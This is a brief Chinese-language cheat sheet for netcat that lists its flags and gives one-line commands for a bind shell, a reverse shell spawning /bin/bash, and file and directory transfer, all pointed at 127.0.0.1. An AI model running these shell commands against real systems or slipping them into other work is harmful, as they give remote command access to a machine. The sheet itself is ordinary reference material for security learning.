# nc

nc 牛逼 nc 牛逼 nc 牛逼

### 命令格式

```shell
nc -lv [端口]
-u 指定nc使用UDP协议，默认为TCP
-e 指定对应的应用程序
-l 用于指定nc将处于侦听模式。指定该参数，则意味着nc被当作server，侦听并接受连接，而非向其它地址发起连接
-v 输出交互或出错信息
```

### 正向反弹shell

```shell
nc -lvp 7777 -e /bin/bash     #命令执行
nc 127.0.0.1 7777    #发送命令
```

### 反向反弹shell

```shell
nc -lvp 7777    #命令执行
nc -e /bin/bash 127.0.0.1 7777    #发送命令
```

### 上传文件

```shell 
nc -dlp 7777 < test.sh			#发送文件
nc 127.0.0.1 7777 > test.sh			#接收文件
```

### 目录传输

```shell
tar -cvf - <传输目录> | nc -l 7777		#发送目录
nc -n 127.0.0.1 7777 | tar -xvf -			#接收目录
```